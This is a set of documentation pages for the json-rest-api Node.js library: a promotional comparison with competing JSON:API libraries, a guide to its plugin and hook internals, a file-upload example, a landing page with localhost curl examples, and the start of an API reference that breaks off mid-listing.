# JSON:API Library Comparison

This document compares json-rest-api with other JSON:API libraries in the Node.js ecosystem, highlighting key differences and advantages.

## Overview

json-rest-api is a full-featured, plugin-based JSON:API implementation built on the hooked-api framework. Unlike other solutions, it offers a unique combination of compliance, flexibility, and developer experience.

## Feature Comparison Matrix

| Feature | json-rest-api | json-api-serializer | nestjs-json-api | @jsonapi/server | fortune.js |
|---------|--------------|-------------------|----------------|----------------|------------|
| **Core Features** |
| Full JSON:API 1.1 compliance | ✅ | ⚠️ (serialization only) | ✅ | ✅ | ⚠️ |
| Simplified mode (plain objects) | ✅ | ❌ | ❌ | ❌ | ❌ |
| Plugin architecture | ✅ | N/A | ❌ | ⚠️ | ❌ |
| Framework agnostic | ✅ | ✅ | ❌ (NestJS only) | ✅ | ✅ |
| **Database Support** |
| Knex.js integration | ✅ | ❌ | ❌ | ❌ | ❌ |
| Multiple databases | ✅ (15+) | N/A | ⚠️ (via TypeORM) | ❌ | ⚠️ |
| Migrations | ✅ | N/A | ⚠️ | ❌ | ❌ |
| Query optimization | ✅ | N/A | ❌ | ❌ | ⚠️ |
| **Relationships** |
| BelongsTo/HasMany | ✅ | ✅ | ✅ | ✅ | ✅ |
| Many-to-Many | ✅ | ⚠️ | ✅ | ⚠️ | ✅ |
| Polymorphic | ✅ | ❌ | ❌ | ❌ | ⚠️ |
| Deep includes | ✅ | ⚠️ | ✅ | ⚠️ | ✅ |
| **Advanced Features** |
| File uploads | ✅ | ❌ | ❌ | ❌ | ❌ |
| WebSocket support | ✅ | ❌ | ❌ | ❌ | ❌ |
| Bulk operations | ✅ | ❌ | ❌ | ❌ | ❌ |
| Positioning/sorting | ✅ | ❌ | ❌ | ❌ | ❌ |
| Authentication | ✅ | ❌ | ⚠️ | ❌ | ❌ |
| **Developer Experience** |
| TypeScript support | ✅ | ✅ | ✅ | ❌ | ❌ |
| Active maintenance | ✅ (2025) | ✅ (2024) | ✅ (2024) | 🟡 (2022) | ❌ (2022) |
| Documentation | ✅ | ✅ | ✅ | ⚠️ | ⚠️ |
| Test coverage | ✅ (95%+) | ✅ | ✅ | ⚠️ | ⚠️ |

## Detailed Comparisons

### vs json-api-serializer

**json-api-serializer** is a serialization-only library that focuses on converting JavaScript objects to/from JSON:API format.

**Key Differences:**
- **Scope**: json-api-serializer only handles formatting, while json-rest-api is a complete API solution
- **You still need**: Routing, database layer, relationship handling, query parsing, error handling
- **Best for**: Custom implementations where you want full control over every layer

```javascript
// json-api-serializer (what you write)
const JSONAPISerializer = require('jsonapi-serializer').Serializer;
const BookSerializer = new JSONAPISerializer('books', {
  attributes: ['title', 'author'],
  author: { ref: 'id', included: true }
});

// Plus you need to write:
// - Express routes
// - Database queries
// - Relationship loading
// - Error handling
// - Query parsing

// json-rest-api (complete solution)
import { Api } from 'hooked-api';
import { RestApiPlugin, RestApiKnexPlugin } from 'json-rest-api';

const api = new Api({ name: 'bookstore-api' });
await api.use(RestApiPlugin); // URLs auto-detected
await api.use(RestApiKnexPlugin, { knex });

await api.addResource('books', {
  schema: {
    id: { type: 'id' },
    title: { type: 'string', required: true },
    author_id: { type: 'id', belongsTo: 'authors', as: 'author' }
  },
  relationships: {
    author: { belongsTo: 'authors' }
  }
});
await api.resources.books.createKnexTable();
// That's it - routing, DB, serialization all handled
```

### vs nestjs-json-api

**nestjs-json-api** provides JSON:API support specifically for NestJS applications using decorators.

**Key Differences:**
- **Framework lock-in**: Requires NestJS, while json-rest-api works with any framework
- **Architecture**: Class-based with decorators vs plugin-based composition
- **Database**: Limited to TypeORM, while json-rest-api uses Knex for broader support

```typescript
// nestjs-json-api (NestJS only)
@JsonApiResource('books')
export class BookEntity {
  @JsonApiAttribute()
  title: string;
  
  @JsonApiBelongsTo('authors')
  author: AuthorEntity;
}

// json-rest-api (framework agnostic)
import { Api } from 'hooked-api';
import { RestApiPlugin, ExpressPlugin, SocketIOPlugin } from 'json-rest-api';

const api = new Api({ name: 'books-api' });
await api.use(RestApiPlugin);
await api.use(ExpressPlugin);    // HTTP transport
await api.use(SocketIOPlugin);   // WebSocket transport

await api.addResource('books', {
  schema: {
    id: { type: 'id' },
    title: { type: 'string', required: true },
    author_id: { type: 'id', belongsTo: 'authors', as: 'author' }
  },
  relationships: {
    author: { belongsTo: 'authors' }
  }
});
// Works with Express, Fastify, or any framework - plus WebSockets!
```

### vs @jsonapi/server

**@jsonapi/server** is a lightweight JSON:API framework that provides basic compliance.

**Key Differences:**
- **Features**: json-rest-api offers many more features (file uploads, WebSockets, bulk operations)
- **Database**: No built-in database support vs comprehensive Knex integration
- **Maintenance**: Semi-active (2022) vs actively maintained
- **TypeScript**: No TypeScript support vs full TypeScript

### vs fortune.js

**fortune.js** is a hypermedia API framework with optional JSON:API support.

**Key Differences:**
- **Maintenance**: Abandoned (2022) vs actively maintained
- **Focus**: Generic hypermedia vs dedicated JSON:API implementation
- **Plugin ecosystem**: Limited vs extensive hooked-api ecosystem
- **Modern features**: Lacks WebSocket support, file uploads, etc.

## Unique json-rest-api Features

### 1. Simplified Mode

No other library offers dual-mode operation:

```javascript
// JSON:API mode (for HTTP clients)
const response = await fetch('/api/books', {
  method: 'POST',
  headers: { 'Content-Type': 'application/vnd.api+json' },
  body: JSON.stringify({
    data: {
      type: 'books',
      attributes: { title: 'My Book' },
      relationships: {
        author: { data: { type: 'authors', id: '1' } }
      }
    }
  })
});
// Returns: { data: { type: 'books', id: '1', attributes: {...}, relationships: {...} } }

// Simplified mode (for internal/programmatic use)
const book = await api.resources.books.post({
  title: 'My Book',
  author_id: 1
});
// Returns: { id: '1', title: 'My Book', author_id: 1 }

// Configure both modes simultaneously
await api.use(RestApiPlugin, {
  simplifiedApi: true,      // Programmatic calls use plain objects
  simplifiedTransport: false // HTTP endpoints use JSON:API format
});
```

### 2. Plugin Architecture

Unmatched flexibility through composition:

```javascript
import { Api } from 'hooked-api';
import { 
  RestApiPlugin, 
  RestApiKnexPlugin, 
  ExpressPlugin,
  CorsPlugin,
  JwtAuthPlugin,
  FileHandlingPlugin,
  BulkOperationsPlugin,
  SocketIOPlugin
} from 'json-rest-api';

const api = new Api({ name: 'full-featured-api' });

// Core functionality
await api.use(RestApiPlugin); // URLs auto-detected
await api.use(RestApiKnexPlugin, { knex: connection });

// Transport layer
await api.use(ExpressPlugin, { mountPath: '/api' });

// Cross-cutting concerns
await api.use(CorsPlugin, { 
  origin: ['https://app.example.com'],
  credentials: true 
});
await api.use(JwtAuthPlugin, { 
  secret: process.env.JWT_SECRET,
  expiresIn: '24h' 
});

// Advanced features
await api.use(FileHandlingPlugin, { 
  storage: 's3',
  bucket: 'my-uploads' 
});
await api.use(BulkOperationsPlugin, { 
  maxBulkOperations: 100 
});
await api.use(SocketIOPlugin, { 
  cors: { origin: "https://app.example.com" } 
});

// Each plugin extends the API with new capabilities
// All work together seamlessly through the plugin system
```

### 3. Advanced Relationship Handling

Superior polymorphic relationship support:

```javascript
// Define polymorphic resource
await api.addResource('comments', {
  schema: {
    id: { type: 'id' },
    content: { type: 'string', required: true },
    // Polymorphic foreign keys
    commentable_type: { type: 'string', required: true },
    commentable_id: { type: 'id', required: true }
  },
  relationships: {
    commentable: {
      belongsToPolymorphic: {
        types: ['posts', 'videos', 'articles'],
        typeField: 'commentable_type',
        idField: 'commentable_id'
      }
    }
  }
});

// Parent resources define reverse relationship
await api.addResource('posts', {
  relationships: {
    comments: { hasMany: 'comments', via: 'commentable' }
  }
});

// Automatically handles type resolution and eager loading
const comment = await api.resources.comments.get({
  id: '1',
  queryParams: { include: ['commentable'] } // Works with any type
});

// Create polymorphic relationships
await api.resources.comments.post({
  content: 'Great post!',
  commentable_type: 'posts',
  commentable_id: 1
});
```

### 4. N+1 Query Prevention

Automatic optimization that competitors lack:

```javascript
// Define resources with nested relationships
await api.addResource('countries', {
  relationships: {
    publishers: { hasMany: 'publishers', foreignKey: 'country_id' }
  }
});

await api.addResource('publishers', {
  relationships: {
    books: { hasMany: 'books', foreignKey: 'publisher_id' },
    country: { belongsTo: 'countries' }
  }
});

await api.addResource('books', {
  relationships: {
    authors: { hasMany: 'authors', through: 'book_authors', foreignKey: 'book_id', otherKey: 'author_id' },
    publisher: { belongsTo: 'publishers' }
  }
});

// This generates optimized queries automatically
const books = await api.resources.books.query({
  queryParams: {
    include: [
      'authors',                    // Include book authors
      'publisher',                  // Include publisher
      'publisher.country'           // Include publisher's country (nested)
    ],
    page: { size: 20, number: 1 }
  }
});

// json-rest-api automatically:
// 1. Identifies all needed relationships
// 2. Generates optimal JOIN queries  
// 3. Batches relationship loading
// 4. Returns properly structured JSON:API response
//
// Instead of 1 + N + N*M queries, this executes only ~4 optimized queries
// regardless of how many books, publishers, or authors are returned
```

## When to Choose json-rest-api

### Choose json-rest-api when you need:
- ✅ Full JSON:API compliance with minimal setup
- ✅ Flexibility to add/remove features via plugins
- ✅ Support for multiple databases (PostgreSQL, MySQL, SQLite, etc.)
- ✅ Advanced features like file uploads, WebSockets, bulk operations
- ✅ Both JSON:API and simplified object formats
- ✅ Production-ready solution with active maintenance

### Consider alternatives when:
- ❌ You only need serialization (use json-api-serializer)
- ❌ You're locked into NestJS (use nestjs-json-api)
- ❌ You want to build everything from scratch
- ❌ You need a different hypermedia format (not JSON:API)

## Migration Guide

### From json-api-serializer

```javascript
// Before (json-api-serializer + custom code)
app.get('/books', async (req, res) => {
  const books = await db.select('*').from('books');
  const serialized = new BookSerializer(books);
  res.json(serialized);
});

// After (json-rest-api)
import { Api } from 'hooked-api';
import { RestApiPlugin, RestApiKnexPlugin, ExpressPlugin } from 'json-rest-api';

const api = new Api({ name: 'books-api' });
await api.use(RestApiPlugin);
await api.use(RestApiKnexPlugin, { knex: db });
await api.use(ExpressPlugin, { mountPath: '/api' });

await api.addResource('books', {
  schema: {
    id: { type: 'id' },
    title: { type: 'string', required: true }
  }
});

const app = express();
app.use(api.http.express.router);
// All routes, serialization, and DB queries handled
```

### From nestjs-json-api

```typescript
// Before (NestJS with decorators)
@Controller('books')
export class BooksController {
  @Get()
  @JsonApiResponse(BookEntity)
  findAll() { /* custom implementation needed */ }
  
  @Get(':id')
  @JsonApiResponse(BookEntity)
  findOne(@Param('id') id: string) { /* custom implementation needed */ }
}

// After (json-rest-api - zero boilerplate)
import { Api } from 'hooked-api';
import { RestApiPlugin, RestApiKnexPlugin } from 'json-rest-api';

const api = new Api({ name: 'books-api' });
await api.use(RestApiPlugin);
await api.use(RestApiKnexPlugin, { knex });

await api.addResource('books', {
  schema: {
    id: { type: 'id' },
    title: { type: 'string', required: true },
    published: { type: 'boolean', default: false }
  },
  readScopes: {
    published: (query) => query.where('published', true)
  }
});
// GET /books, GET /books/:id, POST /books, etc. all automatically available
```

## Conclusion

json-rest-api stands out as the most comprehensive JSON:API solution for Node.js:

1. **Complete Solution**: Unlike serialization-only libraries, it handles everything
2. **Flexible Architecture**: Plugin-based design beats monolithic frameworks
3. **Superior Features**: Simplified mode, file uploads, WebSockets, and more
4. **Active Development**: Regular updates and community support
5. **Production Ready**: Battle-tested with extensive test coverage

For teams building JSON:API services in 2025, json-rest-api offers the best combination of compliance, features, and developer experience.# Developer Contribution Guide

This guide is for developers who want to contribute to the json-rest-api codebase and understand its internal architecture.

## Introduction

json-rest-api is NOT a standalone library - it's a collection of plugins for [hooked-api](https://github.com/mercmobily/hooked-api). Each plugin extends the API with specific functionality by:

- Adding methods to the API or to resources
- Running hooks at strategic points
- Listening to global events

## What Each Plugin Does

### Core Pattern
Every plugin follows this structure:
```javascript
export const SomePlugin = {
  name: 'plugin-name',
  dependencies: ['other-plugin'], // optional
  
  install({ helpers, addScopeMethod, addApiMethod, vars, addHook, runHooks, on, /* ... */ }) {
    // 1. Add methods (API-level or resource-level)
    // 2. Add hooks to extend behavior
    // 3. Listen to events from other plugins
    // 4. Set up helpers for other plugins to use
  }
}
```

### Key Plugins
- **RestApiPlugin**: Defines REST methods (get, post, patch, delete) and core hooks
- **RestApiKnexPlugin**: Implements data helpers used by REST methods
- **ExpressPlugin**: Creates HTTP endpoints by listening to route events

## Resources vs Scopes

An important concept: `api.resources` is just an alias to `api.scopes`:

```javascript
// In rest-api-plugin.js
setScopeAlias('resources', 'addResource');
```

This means:
- `api.resources` === `api.scopes`
- `api.addResource()` === `api.addScope()`
- "Resource" is REST terminology, "Scope" is hooked-api terminology
- They're the same thing!

## Global Hooks Run by the Library

### Core hooked-api Hooks

The hooked-api framework provides several system-level hooks that plugins can use:

1. **scope:added** - Fired when a new scope (resource) is added via `api.addScope()` or `api.addResource()`
   - This is the most important  hook for plugins that need to set up resources
   - Receives context with `scopeName`, `scopeOptions`, and `vars`
   - Used by rest-api-plugin to compile schemas, validate relationships, and register routes

3. **plugin:installed** - Fired after each plugin is installed
   - Receives the plugin name and configuration

4. **error** - Global error handling hook
   - Allows plugins to intercept and handle errors

Example of using scope:added:
```javascript
// This is how rest-api-plugin uses scope:added to set up resources
addHook('scope:added', 'compileResourceSchemas', {}, async ({ context, scopes, runHooks }) => {
  // context.scopeName contains the resource name
  // This runs for EVERY resource added to the API
  const scope = scopes[context.scopeName];
  await compileSchemas(scope, { context, runHooks });
});
```

## Understanding vars and helpers in hooked-api

### vars
The `vars` object is a cascading configuration system:
- Set at global level: `vars.someValue = 'default'`
- Override at scope level: `scope.vars.someValue = 'specific'`
- Values cascade: scope → global → undefined

Example from rest-api-plugin:
```javascript
vars.queryDefaultLimit = restApiOptions.queryDefaultLimit || DEFAULT_QUERY_LIMIT
vars.queryMaxLimit = restApiOptions.queryMaxLimit || DEFAULT_MAX_QUERY_LIMIT
```

### helpers
Helpers are shared functions that plugins provide for others to use:
- Pure functions (no side effects)
- Set by one plugin, used by others
- Example: Knex plugin provides `helpers.dataGet`, REST plugin uses it

```javascript
// Knex plugin sets:
helpers.dataGet = async ({ scopeName, context }) => { /* ... */ }

// REST plugin uses:
context.record = await helpers.dataGet({ scopeName, context, runHooks })
```

## Plugin Event Listening and Method Definition

Plugins interact through three mechanisms:

### 1. Global API Methods
```javascript
// Define
addApiMethod('addRoute', addRouteMethod);

// Use
api.addRoute({ method: 'GET', path: '/users', handler: myHandler })
```

### 2. Resource Methods
```javascript
// Define
addScopeMethod('get', getMethod);

// Use
api.resources.users.get({ id: '123' })
```

### 3. Event Listening
```javascript
// Listen
on('route:added', ({ route, scopeName }) => {
  console.log(`Route added for ${scopeName}`)
})

// Emit (done internally by hooked-api)
```

## Relationship Between rest-api-plugin and rest-api-knex-plugin

The relationship is complementary:

### rest-api-plugin.js
- Defines the REST API interface (methods like get, post, patch, delete)
- Orchestrates the request flow through hooks
- Validates inputs
- Transforms between formats (JSON:API ↔ simplified)
- Does NOT touch the database

### rest-api-knex-plugin.js
- Implements the data helpers that rest-api-plugin calls
- Provides: `dataGet`, `dataPost`, `dataPatch`, `dataDelete`, etc.
- Handles all database operations
- Transforms between database format and JSON:API
- Manages relationships at the database level

Example flow:
```javascript
// In rest-api-plugin get method:
await runHooks('beforeDataGet');
context.record = await helpers.dataGet({ scopeName, context, runHooks });
await runHooks('afterDataGet');

// dataGet is provided by rest-api-knex-plugin
```

## API Methods Run Hooks for Extensibility

Every REST method (get, post, patch, delete) follows this pattern:

```javascript
async function someMethod({ params, context, runHooks, /* ... */ }) {
  // 1. Validate
  validatePayload(params);
  
  // 2. Check permissions
  await scope.checkPermissions({ method: 'get', /* ... */ });
  
  // 3. Run before hooks
  await runHooks('beforeData');
  await runHooks('beforeDataGet');
  
  // 4. Perform operation (via helper)
  context.record = await helpers.dataGet({ /* ... */ });
  
  // 5. Run after hooks
  await runHooks('enrichRecord');
  
  // 6. Run finish hooks
  await runHooks('finish');
  await runHooks('finishGet');
  
  return context.record;
}
```

This allows plugins to hook into any phase of the request.

## How addRoute() Works in Detail

The `addRoute` implementation demonstrates the plugin communication pattern perfectly:

### 1. API Method Definition (rest-api-plugin)
```javascript
// In rest-api-plugin.js
addApiMethod('addRoute', addRouteMethod);

// In add-route.js
export default async ({ params, context, runHooks }) => {
  const { method, path, handler } = params;
  
  // Validate
  if (!method || !path || !handler) {
    throw new ValidationError('Route requires method, path, and handler');
  }
  
  // Copy params to context for hooks
  Object.assign(context, params);
  
  // Run the hook - this notifies all listeners
  await runHooks('addRoute');
  
  return { registered: true, method, path };
}
```

### 2. Route Registration (registerScopeRoutes hook)
When a resource is added, routes are automatically registered:
```javascript
// In register-scope-routes.js
await api.addRoute({
  method: 'GET',
  path: `${basePath}/${scopeName}`,
  handler: createRouteHandler(scopeName, 'query')
});

await api.addRoute({
  method: 'GET',
  path: `${basePath}/${scopeName}/:id`,
  handler: createRouteHandler(scopeName, 'get')
});
// ... etc for POST, PUT, PATCH, DELETE
```

### 3. Transport Implementation (express-plugin)
The Express plugin listens for the addRoute hook:
```javascript
// In express-plugin.js
addHook('addRoute', 'expressRouteCreator', {}, async ({ context }) => {
  const { method, path, handler } = context;
  
  // Convert to Express format
  const expressMethod = method.toLowerCase();
  const expressPath = convertToExpressPattern(path);
  
  // Create Express route
  router[expressMethod](expressPath, async (req, res) => {
    try {
      // Call the generic handler
      const result = await handler({
        queryString: req.url.split('?')[1] || '',
        headers: req.headers,
        params: req.params,
        body: req.body,
        context: createContext(req, res, 'express')
      });
      
      // Send response
      res.status(200).json(result);
    } catch (error) {
      // Handle errors
      handleError(error, req, res);
    }
  });
});
```

### 4. The Handler Function
The handler passed to addRoute is transport-agnostic:
```javascript
const createRouteHandler = (scopeName, methodName) => {
  return async ({ queryString, headers, params, body, context }) => {
    const scope = api.scopes[scopeName];
    
    // Build method parameters
    const methodParams = {};
    if (params.id) methodParams.id = params.id;
    if (body) methodParams.inputRecord = body;
    if (queryString) methodParams.queryParams = parseJsonApiQuery(queryString);
    
    // Call the resource method
    return await scope[methodName](methodParams, context);
  };
};
```

This architecture means:
- The REST plugin doesn't know about Express
- The Express plugin doesn't know about REST semantics
- They communicate through the addRoute hook
- Other transports (Fastify, Koa) can implement the same hook

## Summary

The power of json-rest-api comes from:
1. **Plugin composition** - Each plugin does one thing well
2. **Hook-based extensibility** - Any behavior can be extended
3. **Transport agnosticism** - REST logic is separate from HTTP handling
4. **Pure helpers** - Data operations are predictable and testable

When contributing:
- Identify which plugin your change belongs in
- Use hooks to extend, don't modify core code
- Keep helpers pure
- Follow the established patterns# Complete File Upload Example with Multiple Files

This guide shows a complete example of implementing file uploads with jsonrestapi, including:
- Multiple file fields (images and PDFs)
- Different storage configurations for different file types
- HTML form for testing uploads
- Express static file serving

## Complete Example

```javascript
import { Api } from 'hooked-api';
import { RestApiPlugin, FileHandlingPlugin, ExpressPlugin } from 'json-rest-api';
import { LocalStorage } from 'json-rest-api/plugins/storage/local-storage.js';
import express from 'express';

// Create API
const api = new Api({
  name: 'my-library-api',
});

// Create storage for different file types
const coverStorage = new LocalStorage({
  directory: './uploads/covers',
  baseUrl: 'http://localhost:3000/uploads/covers',
  nameStrategy: 'hash',
  allowedExtensions: ['.jpg', '.jpeg', '.png', '.gif']
});

const pdfStorage = new LocalStorage({
  directory: './uploads/pdfs',
  baseUrl: 'http://localhost:3000/uploads/pdfs',
  nameStrategy: 'timestamp'
});

// Use plugins
api.use(RestApiPlugin);
api.use(FileHandlingPlugin);
api.use(ExpressPlugin);  // File parser configuration shown in connector plugins section

// Define schema with multiple file fields
api.addResource('books', {
  schema: {
    title: { type: 'string', required: true },
    author: { type: 'string', required: true },
    year: { type: 'number' },
    cover: {
      type: 'file',
      storage: coverStorage,
      accepts: ['image/*'],
      maxSize: '5mb'
    },
    sample: {
      type: 'file',
      storage: pdfStorage,
      accepts: ['application/pdf'],
      maxSize: '10mb',
      required: false
    }
  }
});

// Simple data helpers
api.vars.helpers.dataPost = async ({ scopeName, inputRecord }) => {
  const newBook = {
    id: String(Date.now()),
    ...inputRecord.data.attributes
  };
  
  console.log('Created book:', newBook);
  
  return {
    data: {
      type: 'books',
      id: newBook.id,
      attributes: newBook
    }
  };
};

api.vars.helpers.dataQuery = async () => {
  return { data: [] };
};

// Express setup
const app = express();
app.use('/uploads', express.static('./uploads'));

// Test form
app.get('/', (req, res) => {
  res.send(`
    <form action="/api/books" method="POST" enctype="multipart/form-data">
      <h2>Add a Book</h2>
      <p>Title: <input name="title" required></p>
      <p>Author: <input name="author" required></p>
      <p>Year: <input name="year" type="number"></p>
      <p>Cover: <input name="cover" type="file" accept="image/*"></p>
      <p>Sample PDF: <input name="sample" type="file" accept=".pdf"></p>
      <button type="submit">Add Book</button>
    </form>
  `);
});

api.express.mount(app);

app.listen(3000, () => {
  console.log('Library API running at http://localhost:3000');
  console.log('Test form at http://localhost:3000');
  console.log('API endpoints at http://localhost:3000/api/books');
}).on('error', (err) => {
  console.error('Failed to start server:', err);
  process.exit(1)
});
```

Remember to install the required peer dependency:

```bash
npm install busboy
```

## Key Features Demonstrated

### Multiple Storage Configurations

The example shows how to create different storage configurations for different file types:
- **Cover images**: Use hash naming strategy and restrict to image files
- **PDF samples**: Use timestamp naming strategy for PDFs

### HTML Test Form

The example includes a simple HTML form for testing file uploads without needing external tools.

### Static File Serving

The Express app serves uploaded files directly:
```javascript
app.use('/uploads', express.static('./uploads'));
```

This allows uploaded files to be accessed via URLs like:
- `http://localhost:3000/uploads/covers/abc123.jpg`
- `http://localhost:3000/uploads/pdfs/1234567890.pdf`

## Testing the Example

1. Run the server
2. Open http://localhost:3000 in your browser
3. Fill out the form and select files
4. Submit to see the file upload in action
5. Check the console for the created book data
6. Access uploaded files via their URLs

## Next Steps

- Add validation for file types
- Implement file deletion when records are deleted
- Add image resizing for covers
- Generate thumbnails
- Add virus scanning for uploaded files
- Implement S3 storage for production---
layout: default
---

# Build REST APIs in Minutes, Not Days

JSON REST API is a lightweight, plugin-based framework that makes building REST APIs incredibly simple. With automatic validation, smart relationships, and native JSON:API support, you can focus on your business logic instead of boilerplate.

<div style="display: flex; gap: 24px; margin: 32px 0; align-items: flex-start;">
  <div style="display: flex; gap: 16px; flex-wrap: wrap;">
    <a href="{{ '/QUICKSTART' | relative_url }}" class="button">Get Started</a>
    <a href="{{ '/GUIDE' | relative_url }}" class="button secondary">Read the Guide</a>
  </div>
  
  <div style="background: #f8f9fa; border-radius: 8px; padding: 16px 20px; font-style: italic; color: #555; flex: 1; margin-left: 24px;">
    A heartfelt thank you to Dario and Daniela Amodei and the entire Anthropic team for creating transformative AI technology that opens endless possibilities for developers worldwide. Your vision, combined with incredibly accessible pricing, has democratized access to cutting-edge AI and empowered countless innovators to build the future. (No, we weren't asked nor paid in any way for this message - we're just genuinely grateful!)
  </div>
</div>

## Why JSON REST API?

<div class="feature-grid">
  <div class="feature-card">
    <h3>🚀 Zero Configuration</h3>
    <p>Get a fully functional API running in under 5 minutes. No complex setup or configuration files needed.</p>
  </div>
  
  <div class="feature-card">
    <h3>🔌 Plugin Architecture</h3>
    <p>Extend your API with powerful plugins. Authentication, validation, CORS, and more - just plug and play.</p>
  </div>
  
  <div class="feature-card">
    <h3>🔗 Smart Relationships</h3>
    <p>Define relationships once and get automatic joins, nested queries, and eager loading out of the box.</p>
  </div>
  
  <div class="feature-card">
    <h3>✅ Built-in Validation</h3>
    <p>Schema-based validation ensures your data is always clean. No more manual validation code.</p>
  </div>
  
  <div class="feature-card">
    <h3>📦 Multiple Storage Options</h3>
    <p>Start with in-memory storage for development, switch to MySQL for production. Same API, no code changes.</p>
  </div>
  
  <div class="feature-card">
    <h3>🎯 JSON:API Compliant</h3>
    <p>Follow industry standards with native JSON:API support. Compatible with any JSON:API client library.</p>
  </div>
  
  <!--
  <div class="feature-card">
    <h3>🌐 Microservices Ready</h3>
    <p>Build distributed systems with native microservices support. Multiple transports, service discovery, and more.</p>
  </div>
  
  <div class="feature-card">
    <h3>🎭 CQRS Support</h3>
    <p>Implement Command Query Responsibility Segregation with event sourcing, projections, and sagas.</p>
  </div>
  
  <div class="feature-card">
    <h3>🔄 API Gateway</h3>
    <p>Transform into an API gateway to orchestrate external services with circuit breakers and saga support.</p>
  </div>
  -->
</div>

## Quick Example

```javascript
import { RestApiPlugin, RestApiKnexPlugin, ExpressPlugin } from 'json-rest-api';
import { Api } from 'hooked-api';
import knexLib from 'knex';
import express from 'express'; // npm install Express

// Create a Knex instance connected to SQLite in-memory database
const knex = knexLib({
  client: 'better-sqlite3',
  connection: { filename: ':memory:' },
  useNullAsDefault: true
});

// Create API instance
const api = new Api({ name: 'book-catalog-api' });

// Install plugins
await api.use(RestApiPlugin); // URLs auto-detected // Basic REST plugin
await api.use(RestApiKnexPlugin, { knex }); // Knex connector
await api.use(ExpressPlugin, {  mountPath: '/api' }); // Express plugin

// Countries table
await api.addResource('countries', {
  schema: {
    name: { type: 'string', required: true, max: 100, search: true },
    code: { type: 'string', max: 2, unique: true, search: true }, // ISO country code
  }
});
await api.resources.countries.createKnexTable()

// Create the express server and add the API's routes 
const app = express();
app.use(api.http.express.router);
app.use(api.http.express.notFoundRouter);

app.listen(3000, () => {
  console.log('Express server started on port 3000. API available at http://localhost:3000/api');
}).on('error', (err) => {
  console.error('Failed to start server:', err);
  process.exit(1)
});
```

That's it! You now have a fully functional REST API with:

- `GET /api/countries` - List all countrie
- `GET /api/countries/:id` - Get a specific country
- `POST /api/countries` - Create a new country
- `PATCH /api/countries/:id` - Update a country
- `DELETE /api/countries/:id` - Delete a country

## Try It Out

```bash
# Create a country
curl -i -X POST http://localhost:3000/api/countries \
  -H "Content-Type: application/json" \
  -d '{"data":{"type": "countries", "attributes": { "name": "United Kingdom", "code": "UK" }}}'

# List all countries
curl -i http://localhost:3000/api/countries

# Get a specific country
curl -i http://localhost:3000/api/countries/1

# Update a country
curl -i -X PATCH http://localhost:3000/api/countries/1 \
  -H "Content-Type: application/json" \
  -d '{"data":{"id":"1", "type": "countries", "attributes": { "name": "England", "code": "UK" }}}'

# Delete a country
curl -i -X DELETE http://localhost:3000/api/countries/1
```

## Ready to Start?

<div style="margin: 32px 0;">
  <a href="{{ '/QUICKSTART' | relative_url }}" class="button">Get Started in 5 Minutes →</a>
</div>

## Installation

```bash
npm install json-rest-api
```

## Learn More

- [Complete Guide]({{ '/GUIDE' | relative_url }}) - Everything you need to know
- [API Reference]({{ '/API' | relative_url }}) - Detailed API documentation
- [Tutorial]({{ '/ONBOARDING' | relative_url }}) - Step-by-step walkthrough
- [GitHub](https://github.com/mobily-enterprises/json-rest-api) - Source code and issues
# JSON REST API - Complete API Reference

This reference provides comprehensive documentation for all methods, parameters, and features available in the json-rest-api library.

## Important Notes

1. **Context Parameter**: The `context` parameter shown in method signatures is typically managed internally by the framework. When using the API programmatically, you usually don't need to provide it unless you're implementing custom authentication or request-specific data.

2. **Simplified Mode Defaults**: 
   - `simplifiedApi`: `true` (default for programmatic API calls)
   - `simplifiedTransport`: `false` (default for HTTP transport)

3. **All parameters must be passed within a single params object** as the first argument to each method.

## Table of Contents

1. [Core API Methods](#core-api-methods)
   - [QUERY - Retrieve Collections](#query---retrieve-collections)
   - [GET - Retrieve Single Resource](#get---retrieve-single-resource)
   - [POST - Create Resource](#post---create-resource)
   - [PUT - Replace Resource](#put---replace-resource)
   - [PATCH - Update Resource](#patch---update-resource)
   - [DELETE - Remove Resource](#delete---remove-resource)
2. [Relationship Methods](#relationship-methods)
   - [getRelated - Retrieve Related Resources](#getrelated---retrieve-related-resources)
   - [getRelationship - Retrieve Relationship Identifiers](#getrelationship---retrieve-relationship-identifiers)
   - [postRelationship - Add to Relationship](#postrelationship---add-to-relationship)
   - [patchRelationship - Replace Relationship](#patchrelationship---replace-relationship)
   - [deleteRelationship - Remove from Relationship](#deleterelationship---remove-from-relationships)
3. [Hook System](#hook-system)
   - [Complete Hook Execution Order](#complete-hook-execution-order)
   - [Hook Context Objects](#hook-context-objects)
4. [Query Features](#query-features)
   - [Filtering](#filtering)
   - [Sorting](#sorting)
   - [Pagination](#pagination)
   - [Sparse Fieldsets](#sparse-fieldsets)
   - [Including Related Resources](#including-related-resources)
5. [Configuration Options](#configuration-options)
6. [Schema Configuration](#schema-configuration)
7. [Error Handling](#error-handling)
8. [Advanced Features](#advanced-features)

---

## Core API Methods

### QUERY - Retrieve Collections

Retrieves a collection of resources with support for filtering, sorting, pagination, and relationship inclusion.

#### Method Signature
```javascript
const result = await api.resources.[resourceType].query(params, context)
```

#### Parameters

All parameters are passed within a single `params` object:

```javascript
{
  queryParams: {
    include: Array,      // Relationship paths to include
    fields: Object,      // Sparse fieldsets
    filters: Object,     // Filter conditions
    sort: Array,         // Sort fields
    page: Object         // Pagination parameters
  },
  simplified: Boolean,   // Override simplified mode (default: true for API)
  transaction: Object    // Database transaction object
}
```

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `queryParams` | Object | No | Query parameters container |
| `queryParams.include` | Array | No | Relationship paths to include (e.g., `['author', 'comments.user']`) |
| `queryParams.fields` | Object | No | Sparse fieldsets - keys are resource types, values are comma-separated field names |
| `queryParams.filters` | Object | No | Filter conditions based on searchSchema configuration |
| `queryParams.sort` | Array | No | Sort fields, prefix with '-' for DESC (e.g., `['title', '-created-at']`) |
| `queryParams.page` | Object | No | Pagination parameters |
| `queryParams.page.number` | Number | No | Page number (1-based, offset pagination) |
| `queryParams.page.size` | Number | No | Items per page |
| `queryParams.page.after` | String | No | Cursor for forward pagination |
| `queryParams.page.before` | String | No | Cursor for backward pagination |
| `simplified` | Boolean | No | Override simplified mode setting (default: true) |
| `transaction` | Object | No | Database transaction object |

#### Return Value

**JSON:API Mode (simplified: false):**
```javascript
{
  data: [
    {
      type: 'articles',
      id: '1',
      attributes: {
        title: 'First Article',
        content: 'Article content...'
      },
      relationships: {
        author: {
          data: { type: 'users', id: '10' }
        }
      }
    }
  ],
  included: [
    {
      type: 'users',
      id: '10',
      attributes: {
